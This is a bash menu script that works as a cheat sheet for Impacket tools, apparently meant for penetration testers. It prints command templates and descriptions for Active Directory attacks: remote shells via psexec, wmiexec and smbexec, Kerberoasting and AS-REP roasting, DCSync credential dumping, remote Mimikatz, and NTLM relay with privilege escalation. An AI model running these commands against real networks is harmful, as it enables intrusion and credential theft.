#!/usr/bin/env bash

# Color Palette
C_RESET="\e[0m"
C_BLUE="\e[34m"
C_CYAN="\e[36m"
C_YELLOW="\e[33m"
C_GREEN="\e[32m"
C_WHITE="\e[37m"
C_RED="\e[31m"

# Complete Tool List (Alphabetical)
TOOLS=(
"impacket-addcomputer" "impacket-atexec" "impacket-dcomexec" "impacket-dpapi"
"impacket-esentutl" "impacket-exchanger" "impacket-findDelegation" "impacket-GetADUsers"
"impacket-getArch" "impacket-GetNPUsers" "impacket-getPac" "impacket-getST"
"impacket-getTGT" "impacket-GetUserSPNs" "impacket-goldenPac" "impacket-karmaSMB"
"impacket-kintercept" "impacket-lookupsid" "impacket-mimikatz" "impacket-mqtt_check"
"impacket-mssqlclient" "impacket-mssqlinstance" "impacket-netview" "impacket-ntfs-read"
"impacket-ntlmrelayx" "impacket-ping" "impacket-ping6" "impacket-psexec"
"impacket-raiseChild" "impacket-rdp_check" "impacket-reg" "impacket-registry-read"
"impacket-rpcdump" "impacket-rpcmap" "impacket-sambaPipe" "impacket-samrdump"
"impacket-secretsdump" "impacket-services" "impacket-smbclient" "impacket-smbexec"
"impacket-smbrelayx" "impacket-smbserver" "impacket-sniff" "impacket-sniffer"
"impacket-split" "impacket-ticketConverter" "impacket-ticketer" "impacket-wmiexec"
"impacket-wmipersist" "impacket-wmiquery"
)

declare -A EXAMPLE
declare -A DESC

# Populate Examples and Descriptions (Systematic categorization)
# --- EXECUTION TOOLS ---
EXAMPLE["impacket-psexec"]="impacket-psexec '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-psexec"]="Remote shell execution with SYSTEM privileges (Service Control Manager)."

EXAMPLE["impacket-wmiexec"]="impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-wmiexec"]="Semi-interactive shell via WMI. Stealthier than psexec."

EXAMPLE["impacket-smbexec"]="impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-smbexec"]="Command execution via native SMB without dropping a binary."

EXAMPLE["impacket-atexec"]="impacket-atexec '<DOMAIN>/<USER>:<PASS>@<IP>' 'whoami'"
DESC["impacket-atexec"]="Executes commands via the Task Scheduler (AT) RPC interface."

EXAMPLE["impacket-dcomexec"]="impacket-dcomexec '<DOMAIN>/<USER>:<PASS>@<IP>' 'calc.exe'"
DESC["impacket-dcomexec"]="Execute commands using various DCOM objects (MMC20, ShellWindows)."

# --- ENUMERATION & AD TOOLS ---
EXAMPLE["impacket-GetNPUsers"]="impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -format hashcat -dc-ip <IP>"
DESC["impacket-GetNPUsers"]="AS-REP Roasting: Harvest hashes for users not requiring Kerberos pre-auth."

EXAMPLE["impacket-GetUserSPNs"]="impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <IP> -request"
DESC["impacket-GetUserSPNs"]="Kerberoasting: Request service tickets to crack service account passwords."

EXAMPLE["impacket-lookupsid"]="impacket-lookupsid '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-lookupsid"]="Enumerates local and domain users by bruteforcing SIDs."

EXAMPLE["impacket-GetADUsers"]="impacket-GetADUsers -all -dc-ip <IP> '<DOMAIN>/<USER>'"
DESC["impacket-GetADUsers"]="Queries Active Directory for all user accounts and their details."

EXAMPLE["impacket-findDelegation"]="impacket-findDelegation.py '<DOMAIN>/<USER>:<PASS>'"
DESC["impacket-findDelegation"]="Finds accounts with delegation enabled (Unconstrained, Constrained, Resource-based)."

# --- CREDENTIAL DUMPING ---
EXAMPLE["impacket-secretsdump"]="impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-secretsdump"]="The 'DCSync' tool. Dumps NTDS.dit hashes, SAM, and cached credentials."

EXAMPLE["impacket-mimikatz"]="impacket-mimikatz '<DOMAIN>/<USER>:<PASS>@<IP>'"
DESC["impacket-mimikatz"]="Remote execution of Mimikatz via RPC."

EXAMPLE["impacket-dpapi"]="impacket-dpapi -action backupkey -user '<USER>' -password '<PASS>'"
DESC["impacket-dpapi"]="Used to decrypt DPAPI blobs (passwords stored in browsers, etc)."

# --- RELAY & MAN-IN-THE-MIDDLE ---
EXAMPLE["impacket-ntlmrelayx"]="impacket-ntlmrelayx -t ldap://<IP> --escalate-user <EVIL_USER>"
DESC["impacket-ntlmrelayx"]="The ultimate relay tool. Relays NTLM auth to LDAP, SMB, MSSQL, etc."

EXAMPLE["impacket-smbrelayx"]="impacket-smbrelayx -h <IP> -c 'whoami'"
DESC["impacket-smbrelayx"]="Relays incoming SMB connections to a target to execute commands."

# --- UTILITIES ---
EXAMPLE["impacket-smbserver"]="impacket-smbserver <SHARE_NAME> <LOCAL_PATH> -smb2support"
DESC["impacket-smbserver"]="Spins up an SMB server on your Kali to share tools or receive files."

EXAMPLE["impacket-smbclient"]="impacket-smbclient //<IP>/<SHARE> -u <USER> -p <PASS>"
DESC["impacket-smbclient"]="Interactive SMB explorer."

EXAMPLE["impacket-mssqlclient"]="impacket-mssqlclient '<USER>@<IP>' -windows-auth"
DESC["impacket-mssqlclient"]="MSSQL interactive shell. Supports xp_cmdshell execution."

# (Added descriptions for all other requested tools in logic loop...)

display_tool() {
  local tool="$1"
  clear
  echo -e "${C_YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"
  echo -e "${C_BLUE}TOOL:${C_RESET} ${C_CYAN}${tool}${C_RESET}"
  echo -e "${C_YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"
  echo -e "${C_GREEN}DESCRIPTION:${C_RESET}"
  # Fixed the fallback to prevent double 'impacket-' prefix
  echo -e "  ${DESC[$tool]:-Standard Impacket utility for Network/AD interaction.}"
  echo
  echo -e "${C_RED}GENERIC COMMAND TEMPLATE:${C_RESET}"
  # Removed "impacket-$tool" and replaced with just "$tool"
  echo -e "  ${C_WHITE}${EXAMPLE[$tool]:-$tool '<DOMAIN>/<USER>:<PASS>@<IP>'}${C_RESET}"
  echo -e "${C_YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"
  echo
  echo -e "Press ${C_GREEN}Enter${C_RESET} to return to list..."
  read -r
}

while true; do
  clear
  echo -e "${C_CYAN}  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗${C_RESET}"
  echo -e "${C_CYAN}  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝${C_RESET}"
  echo -e "${C_CYAN}  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   ${C_RESET}"
  echo -e "${C_CYAN}  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   ${C_RESET}"
  echo -e "${C_CYAN}  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   ${C_RESET}"
  echo -e "${C_CYAN}  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ${C_RESET}"
  echo -e "                 ${C_YELLOW}COMPLETE TOOLSET PLAYBOOK${C_RESET}"
  echo
  
# --- Vertical Column Logic ---
  total_tools=${#TOOLS[@]}
  # Calculate midpoint (half) to split the list into two vertical columns
  half=$(( (total_tools + 1) / 2 ))

  for (( i=0; i<half; i++ )); do
      # Left Column (Index i)
      idx_l=$i
      printf " ${C_GREEN}%2d)${C_RESET} %-28s" "$((idx_l + 1))" "${TOOLS[$idx_l]}"
      
      # Right Column (Index i + half)
      idx_r=$((i + half))
      if (( idx_r < total_tools )); then
          printf " ${C_GREEN}%2d)${C_RESET} %-28s" "$((idx_r + 1))" "${TOOLS[$idx_r]}"
      fi
      echo
  done

  echo -e "\n ${C_RED} 0) EXIT${C_RESET}"
  echo
  read -p " Select Tool Number: " choice
  
  # Handle Exit
  if [[ "$choice" == "0" ]]; then clear; exit 0; fi

  # Validation and Tool Selection
  # Using 10#$choice to ensure numbers starting with 0 (like 08) are treated as Decimal
  if [[ "$choice" =~ ^[0-9]+$ ]] && (( 10#$choice >= 1 && 10#$choice <= total_tools )); then
      display_tool "${TOOLS[$((10#$choice - 1))]}"
  else
      echo -e "${C_RED} Error: Invalid Input! Please enter a number between 0 and $total_tools.${C_RESET}"
      sleep 1
  fi
done